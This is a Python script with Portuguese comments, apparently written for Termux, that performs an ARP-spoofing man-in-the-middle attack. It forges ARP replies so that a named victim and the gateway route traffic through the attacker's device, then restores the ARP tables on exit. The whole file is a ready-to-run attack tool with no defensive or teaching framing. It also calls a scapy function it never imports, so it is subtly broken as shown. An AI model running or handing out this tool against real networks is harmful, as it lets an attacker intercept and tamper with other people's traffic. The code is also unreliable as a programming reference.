from scapy.all import ARP, send, sniff
import os
import time
import sys

def enable_ip_forward():
    """Habilita o encaminhamento de pacotes IP no Termux."""
    try:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[+] Encaminhamento de pacotes IP ativado.")
    except Exception as e:
        print(f"[-] Erro ao ativar encaminhamento: {e}")
        sys.exit(1)

def disable_ip_forward():
    """Desabilita o encaminhamento de pacotes IP no Termux."""
    try:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[+] Encaminhamento de pacotes IP desativado.")
    except Exception as e:
        print(f"[-] Erro ao desativar encaminhamento: {e}")

def get_mac(ip):
    """Obtém o endereço MAC de um IP usando ARP."""
    arp_request = ARP(pdst=ip)
    answered, unanswered = sr(arp_request, timeout=2, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    else:
        print(f"[-] Não foi possível obter o MAC para {ip}")
        return None

def spoof(target_ip, spoof_ip):
    """Realiza spoofing ARP."""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Não foi possível encontrar o MAC para {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, source_ip):
    """Restaura a tabela ARP original."""
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if target_mac and source_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)

def mitm(target_ip, gateway_ip):
    """Executa ataque MITM."""
    enable_ip_forward()
    try:
        print("[*] Iniciando spoofing ARP. Pressione CTRL+C para parar.")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Interrompendo ataque. Restaurando tabelas ARP...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        disable_ip_forward()
        print("[+] Tabelas ARP restauradas. Saindo.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Este script precisa ser executado como root (use tsu).")
        sys.exit(1)

    if len(sys.argv) != 3:
        print("Uso: python mitm.py <IP da vítima> <IP do gateway>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    mitm(target_ip, gateway_ip)
